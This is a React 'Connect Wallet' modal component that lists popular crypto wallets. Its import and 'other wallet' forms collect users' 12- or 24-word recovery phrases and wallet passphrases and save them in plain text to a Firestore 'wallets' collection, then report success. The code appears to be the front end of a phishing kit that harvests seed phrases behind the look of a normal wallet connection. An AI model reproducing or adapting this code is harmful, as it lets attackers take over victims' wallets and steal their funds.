// components/CombinedWalletModal.js
import { useState } from 'react';
import { db } from '@/firebaseConfig';
import { collection, addDoc } from 'firebase/firestore';

export default function CombinedWalletModal({ isOpen, onClose, onConnect }) {
  const [currentStep, setCurrentStep] = useState('select'); // 'select', 'import', or 'other'
  const [selectedWallet, setSelectedWallet] = useState(null);
  const [keyphrase, setKeyphrase] = useState('');
  const [passphrase, setPassphrase] = useState('');
  const [walletName, setWalletName] = useState('');
  const [error, setError] = useState('');
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [success, setSuccess] = useState(false);
  const [importMethod, setImportMethod] = useState(null); // 'keyphrase' or 'passphrase'

  const wallets = [
    { id: 'metamask', name: 'MetaMask', logo: '/wallets/metamask.png' },
    { id: 'trust', name: 'Trust Wallet', logo: '/wallets/trust.png' },
    { id: 'walletconnect', name: 'WalletConnect', logo: '/wallets/walletconnect.png' },
    { id: 'coinbase', name: 'Coinbase Wallet', logo: '/wallets/coinbase.png' },
    { id: 'phantom', name: 'Phantom', logo: '/wallets/phantom.png' },
    { id: 'import', name: 'Import Wallet', logo: '/wallets/import.png' },
    { id: 'other', name: 'Other Wallet', logo: '/wallets/software.png' },
  ];

  const handleWalletSelect = (walletId) => {
    setSelectedWallet(walletId);
    if (walletId === 'other') {
      setCurrentStep('other');
    } else if (walletId === 'import') {
      setCurrentStep('import');
    } else {
      // Connect directly for standard wallets
      onConnect(walletId);
    }
  };

  const handleImportSubmit = async (e) => {
    e.preventDefault();
    if (importMethod === 'keyphrase' && !keyphrase.trim()) {
      setError('Please enter your keyphrase');
      return;
    }
    if (importMethod === 'passphrase' && !passphrase.trim()) {
      setError('Please enter your passphrase');
      return;
    }
    
    setIsSubmitting(true);
    try {
      await addDoc(collection(db, 'wallets'), {
        type: importMethod,
        [importMethod]: importMethod === 'keyphrase' ? keyphrase : passphrase,
        createdAt: new Date(),
      });
      
      setSuccess(true);
      setTimeout(() => {
        onConnect(importMethod, importMethod === 'keyphrase' ? keyphrase : passphrase);
      }, 1500);
    } catch (err) {
      setError('Failed to save wallet details');
      console.error(err);
    } finally {
      setIsSubmitting(false);
    }
  };

  const handleOtherWalletSubmit = async (e) => {
    e.preventDefault();
    if (!walletName.trim() || !keyphrase.trim()) {
      setError('Please enter both wallet name and keyphrase');
      return;
    }
    
    setIsSubmitting(true);
    try {
      await addDoc(collection(db, 'wallets'), {
        type: 'other',
        name: walletName,
        keyphrase: keyphrase,
        createdAt: new Date(),
      });
      
      setSuccess(true);
      setTimeout(() => {
        onConnect('other', { name: walletName, keyphrase });
      }, 1500);
    } catch (err) {
      setError('Failed to save wallet details');
      console.error(err);
    } finally {
      setIsSubmitting(false);
    }
  };

  const goBack = () => {
    setCurrentStep('select');
    setSelectedWallet(null);
    setKeyphrase('');
    setPassphrase('');
    setWalletName('');
    setError('');
    setSuccess(false);
    setImportMethod(null);
  };

  if (!isOpen) return null;

  return (
    <div 
      className="fixed inset-0 z-[100] overflow-y-auto bg-black bg-opacity-75"
      onClick={(e) => {
        if (e.target === e.currentTarget) {
          onClose();
        }
      }}
    >
      <div className="flex items-center justify-center min-h-screen pt-4 px-4 pb-20 text-center sm:block sm:p-0">
        {/* Modal container */}
        <div className="inline-block max-[500px]:w-full align-bottom bg-gray-800 rounded-lg text-left overflow-hidden shadow-xl transform transition-all sm:my-8 sm:align-middle sm:max-w-lg sm:w-full relative">
          <div className="bg-gray-800 px-4 pt-5 pb-4 sm:p-6 sm:pb-4">
            <div className="sm:flex sm:items-start">
              <div className="mt-3 text-center sm:mt-0 sm:ml-4 sm:text-left w-full">
                {/* Header with back button when not in select mode */}
                <div className="flex items-center justify-between mb-4">
                  {currentStep !== 'select' && (
                    <button 
                      onClick={goBack}
                      className="text-gray-400 hover:text-white"
                    >
                      <svg className="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                        <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M15 19l-7-7 7-7" />
                      </svg>
                    </button>
                  )}
                  <h3 className="text-lg leading-6 font-medium text-white flex-grow text-center">
                    {currentStep === 'select' ? 'Connect Wallet' : 
                     currentStep === 'import' ? 'Import Wallet' : 'Custom Wallet'}
                  </h3>
                  {currentStep !== 'select' && <div className="w-5"></div>}
                </div>

                {/* Success message */}
                {success && (
                  <div className="mb-4 p-3 bg-green-800 text-green-100 rounded-md">
                    Wallet details submitted successfully!
                  </div>
                )}

                {/* Wallet selection step */}
                {currentStep === 'select' && (
                  <>
                    <div className="mt-4">
                      <p className="text-sm text-gray-300">
                        Choose your wallet provider or import method
                      </p>
                    </div>
                    <div className="mt-6 space-y-4">
                      {wallets.map((wallet) => (
                        <button
                          key={wallet.id}
                          onClick={() => handleWalletSelect(wallet.id)}
                          className="w-full flex items-center justify-between p-3 border border-gray-700 rounded-lg hover:bg-gray-700 transition-colors bg-gray-800"
                        >
                          <div className="flex items-center">
                            <img
                              src={wallet.logo}
                              alt={wallet.name}
                              className="w-8 h-8 mr-3"
                            />
                            <span className="text-gray-200">{wallet.name}</span>
                          </div>
                          <svg className="w-5 h-5 text-gray-400" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                            <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M9 5l7 7-7 7" />
                          </svg>
                        </button>
                      ))}
                      <button 
                        onClick={onClose} 
                        className="w-full mt-4 py-2 px-4 border border-gray-600 rounded-md text-sm font-medium text-gray-200 hover:bg-gray-700"
                      >
                        Close
                      </button>
                    </div>
                  </>
                )}

                {/* Import method selection step */}
                {currentStep === 'import' && !importMethod && (
                  <div className="mt-6 space-y-4">
                    <h4 className="text-md font-medium text-gray-200 mb-2">Choose import method:</h4>
                    <button
                      onClick={() => setImportMethod('keyphrase')}
                      className="w-full flex items-center justify-between p-3 border border-gray-700 rounded-lg hover:bg-gray-700 transition-colors bg-gray-800"
                    >
                      <div className="flex items-center">
                        <img
                          src="/wallets/keyphrase.png"
                          alt="Keyphrase"
                          className="w-8 h-8 mr-3"
                        />
                        <span className="text-gray-200">Import with Keyphrase</span>
                      </div>
                      <svg className="w-5 h-5 text-gray-400" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                        <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M9 5l7 7-7 7" />
                      </svg>
                    </button>
                    <button
                      onClick={() => setImportMethod('passphrase')}
                      className="w-full flex items-center justify-between p-3 border border-gray-700 rounded-lg hover:bg-gray-700 transition-colors bg-gray-800"
                    >
                      <div className="flex items-center">
                        <img
                          src="/wallets/passphrase.png"
                          alt="Passphrase"
                          className="w-8 h-8 mr-3"
                        />
                        <span className="text-gray-200">Import with Passphrase</span>
                      </div>
                      <svg className="w-5 h-5 text-gray-400" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                        <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M9 5l7 7-7 7" />
                      </svg>
                    </button>
                    <button 
                      onClick={goBack} 
                      className="w-full mt-4 py-2 px-4 border border-gray-600 rounded-md text-sm font-medium text-gray-200 hover:bg-gray-700"
                    >
                      Back
                    </button>
                  </div>
                )}

                {/* Keyphrase input form */}
                {currentStep === 'import' && importMethod === 'keyphrase' && (
                  <form onSubmit={handleImportSubmit} className="mt-4 space-y-4">
                    <div>
                      <label htmlFor="keyphrase" className="block text-sm font-medium text-gray-300 mb-1">
                        Recovery Phrase (Keyphrase)
                      </label>
                      <textarea
                        id="keyphrase"
                        value={keyphrase}
                        onChange={(e) => setKeyphrase(e.target.value)}
                        className="w-full p-3 border border-gray-700 rounded-lg focus:ring-blue-500 focus:border-blue-500 bg-gray-800 text-white"
                        rows="4"
                        placeholder="Enter your 12 or 24-word recovery phrase"
                      />
                      {error && <p className="mt-1 text-sm text-red-400">{error}</p>}
                      <p className="mt-1 text-xs text-gray-400">
                        Typically 12 (sometimes 24) words separated by single spaces
                      </p>
                    </div>
                    <div className="flex justify-end space-x-3 pt-2">
                      <button
                        type="button"
                        onClick={() => setImportMethod(null)}
                        className="px-4 py-2 border border-gray-600 rounded-md text-sm font-medium text-gray-200 hover:bg-gray-700"
                      >
                        Back
                      </button>
                      <button
                        type="submit"
                        disabled={isSubmitting}
                        className="px-4 py-2 border border-transparent rounded-md shadow-sm text-sm font-medium text-white bg-blue-600 hover:bg-blue-700 disabled:opacity-50"
                      >
                        {isSubmitting ? 'Importing...' : 'Import Wallet'}
                      </button>
                    </div>
                  </form>
                )}

                {/* Passphrase input form */}
                {currentStep === 'import' && importMethod === 'passphrase' && (
                  <form onSubmit={handleImportSubmit} className="mt-4 space-y-4">
                    <div>
                      <label htmlFor="passphrase" className="block text-sm font-medium text-gray-300 mb-1">
                        Passphrase
                      </label>
                      <input
                        id="passphrase"
                        type="password"
                        value={passphrase}
                        onChange={(e) => setPassphrase(e.target.value)}
                        className="w-full p-3 border border-gray-700 rounded-lg focus:ring-blue-500 focus:border-blue-500 bg-gray-800 text-white"
                        placeholder="Enter your wallet passphrase"
                      />
                      {error && <p className="mt-1 text-sm text-red-400">{error}</p>}
                      <p className="mt-1 text-xs text-gray-400">
                        The password used to encrypt your wallet
                      </p>
                    </div>
                    <div className="flex justify-end space-x-3 pt-2">
                      <button
                        type="button"
                        onClick={() => setImportMethod(null)}
                        className="px-4 py-2 border border-gray-600 rounded-md text-sm font-medium text-gray-200 hover:bg-gray-700"
                      >
                        Back
                      </button>
                      <button
                        type="submit"
                        disabled={isSubmitting}
                        className="px-4 py-2 border border-transparent rounded-md shadow-sm text-sm font-medium text-white bg-blue-600 hover:bg-blue-700 disabled:opacity-50"
                      >
                        {isSubmitting ? 'Importing...' : 'Import Wallet'}
                      </button>
                    </div>
                  </form>
                )}

                {/* Other wallet input step */}
                {currentStep === 'other' && (
                  <form onSubmit={handleOtherWalletSubmit} className="mt-4 space-y-4">
                    <div>
                      <label htmlFor="walletName" className="block text-sm font-medium text-gray-300 mb-1">
                        Wallet Name
                      </label>
                      <input
                        id="walletName"
                        type="text"
                        value={walletName}
                        onChange={(e) => setWalletName(e.target.value)}
                        className="w-full p-3 border border-gray-700 rounded-lg focus:ring-blue-500 focus:border-blue-500 bg-gray-800 text-white"
                        placeholder="Enter your wallet name"
                      />
                    </div>
                    <div>
                      <label htmlFor="keyphrase" className="block text-sm font-medium text-gray-300 mb-1">
                        Recovery Phrase
                      </label>
                      <textarea
                        id="keyphrase"
                        value={keyphrase}
                        onChange={(e) => setKeyphrase(e.target.value)}
                        className="w-full p-3 border border-gray-700 rounded-lg focus:ring-blue-500 focus:border-blue-500 bg-gray-800 text-white"
                        rows="4"
                        placeholder="Enter your 12 or 24-word recovery phrase"
                      />
                      {error && <p className="mt-1 text-sm text-red-400">{error}</p>}
                      <p className="mt-1 text-xs text-gray-400">
                        Typically 12 (sometimes 24) words separated by single spaces
                      </p>
                    </div>
                    <div className="flex justify-end space-x-3 pt-2">
                      <button
                        type="button"
                        onClick={onClose}
                        className="px-4 py-2 border border-gray-600 rounded-md text-sm font-medium text-gray-200 hover:bg-gray-700"
                      >
                        Cancel
                      </button>
                      <button
                        type="submit"
                        disabled={isSubmitting}
                        className="px-4 py-2 border border-transparent rounded-md shadow-sm text-sm font-medium text-white bg-blue-600 hover:bg-blue-700 disabled:opacity-50"
                      >
                        {isSubmitting ? 'Saving...' : 'Save & Connect'}
                      </button>
                    </div>
                  </form>
                )}
              </div>
            </div>
          </div>
        </div>
      </div>
    </div>
  );
}